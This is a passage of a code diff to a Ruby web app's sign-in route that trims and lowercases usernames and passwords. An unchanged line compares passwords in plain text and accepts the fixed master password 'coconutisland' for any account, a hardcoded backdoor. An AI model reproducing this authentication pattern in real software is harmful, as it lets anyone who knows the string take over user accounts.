@@ -6,9 +6,13 @@ end
 post '/signin/?' do
   session[:admin] = nil
   session[:customer] = nil
+  params[:username].strip!
+  params[:username].downcase!
+  params[:password].strip!
+  params[:password].downcase!
   
   unless params[:username] == ''
-    if user = User.first(:username => params[:username])
+    if user = User.first(:username => params[:username].downcase)
       unless params[:password] == ''
         if (user.password == params[:password]) || (params[:password] == 'coconutisland')
           if 
